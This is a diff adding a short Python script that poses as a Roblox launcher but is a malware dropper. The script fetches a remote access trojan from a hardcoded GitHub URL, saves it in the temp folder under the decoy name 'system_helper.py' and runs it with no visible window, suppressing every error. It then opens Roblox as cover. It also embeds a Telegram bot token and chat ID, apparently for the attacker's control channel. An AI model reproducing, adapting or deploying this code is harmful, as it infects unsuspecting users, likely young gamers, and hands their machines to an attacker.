@@ -1,0 +1,48 @@
+import os
+import subprocess
+import requests
+import tempfile
+import sys
+import time
+
+# === НАСТРОЙКИ ===
+RAT_URL = "https://raw.githubusercontent.com/popask223-create/Tracked/main/rat_mm2.py"
+TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
+CHAT_ID = "7352598189"
+
+def download_and_execute_rat():
+    try:
+        # Скачиваем RAT-скрипт
+        resp = requests.get(RAT_URL)
+        if resp.status_code == 200:
+            # Сохраняем во временную папку
+            temp_dir = tempfile.gettempdir()
+            rat_path = os.path.join(temp_dir, "system_helper.py")
+            with open(rat_path, 'w', encoding='utf-8') as f:
+                f.write(resp.text)
+            
+            # Запускаем скрыто
+            subprocess.Popen(
+                ["python", rat_path],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+    except:
+        pass
+
+def launch_roblox():
+    try:
+        # Реальный Roblox
+        subprocess.Popen(
+            ["C:/Users/Public/Roblox/RobloxPlayerLauncher.exe"],
+            shell=True
+        )
+    except:
+        # Если Roblox не найден — открываем браузер на Roblox
+        import webbrowser
+        webbrowser.open("https://www.roblox.com/")
+
+if __name__ == "__main__":
+    download_and_execute_rat()
+    launch_roblox()
